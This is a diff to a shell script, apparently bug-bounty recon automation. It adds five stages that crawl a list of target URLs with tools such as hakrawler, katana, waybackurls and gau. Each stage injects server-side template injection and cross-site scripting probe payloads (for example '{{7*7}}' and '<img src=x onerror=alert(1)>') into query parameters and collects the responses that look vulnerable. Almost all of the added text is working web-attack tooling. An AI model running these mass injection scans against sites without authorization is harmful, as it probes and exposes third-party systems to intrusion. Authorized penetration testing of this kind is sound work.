@@ -117,6 +117,46 @@ echo
 echo
 echo
 
+echo ================"INIT SSTI"================ | anew ssti2
+echo
+echo
+echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '{{7*7}}' | freq | egrep -v 'Not' | anew ssti2;
+echo
+echo
+echo
+
+echo ================"INIT XSS1"================ | anew xss1
+echo
+echo
+echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss1;
+echo
+echo
+echo
+
+echo ================"INIT XSS2"================ | anew xss2
+echo
+echo
+echo $(cat url) | httpx-toolkit -silent | katana -d 10 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
+echo
+echo
+echo
+
+echo ================"INIT XSS3"================ | anew xss3
+echo
+echo
+echo $(cat url) | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
+echo
+echo
+echo
+
+echo ================"INIT XSS4"================ | anew xss4
+echo
+echo
+gau $(cat url) | httpx-toolkit -silent | qsreplace '<script>alert(1)</script>' | freq | egrep -v 'Not' | anew xss4;
+echo
+echo
+echo
+
 echo ================"INIT NUCLEI"================ | anew nuclei
 echo
 echo
